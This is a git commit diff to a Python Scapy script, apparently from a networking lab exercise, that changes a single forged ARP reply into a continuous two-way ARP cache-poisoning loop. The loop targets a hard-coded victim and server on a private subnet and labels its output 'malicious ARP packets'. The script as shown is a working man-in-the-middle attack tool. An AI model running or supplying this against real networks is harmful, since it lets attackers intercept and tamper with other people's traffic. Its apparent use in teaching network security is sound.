8d7744c46a3f48853fcd031f1c0852405e116cdf
KarolyJ <jonaskaroly15@gmail.com>
2026-04-27 15:22:06 +0200

    fixed 3rd exercise

--- arp_exercise3.py
+++ arp_exercise3.py
@@ -1,4 +1,5 @@
 from scapy.all import *
+import time
 
 VICTIM_IP = "192.168.101.10"
 SERVER_IP = "192.168.101.30"
@@ -8,7 +9,16 @@ ATTACKER_MAC = "02:42:c0:a8:65:14"
 VICTIM_MAC = "02:42:c0:a8:65:0a"
 SERVER_MAC = "02:42:c0:a8:65:1e"
 
-broadcast = Ether(src=ATTACKER_MAC, dst=VICTIM_MAC)
-arp = ARP(op=2, hwdst=VICTIM_MAC, psrc=SERVER_IP)
-sendp (broadcast / arp, verbose=False)
+def spoof(spoof_ip, dst_mac):
+    broadcast = Ether(src=ATTACKER_MAC, dst=dst_mac)
+    arp = ARP(op=2, hwdst=dst_mac, psrc=spoof_ip)
+    sendp(broadcast / arp, verbose= False)
+
+while True:
+    print("Sending malicious ARP packets")
+    spoof(VICTIM_IP, SERVER_MAC)
+    spoof(SERVER_IP, VICTIM_MAC)
+    time.sleep(1)
+
+
 
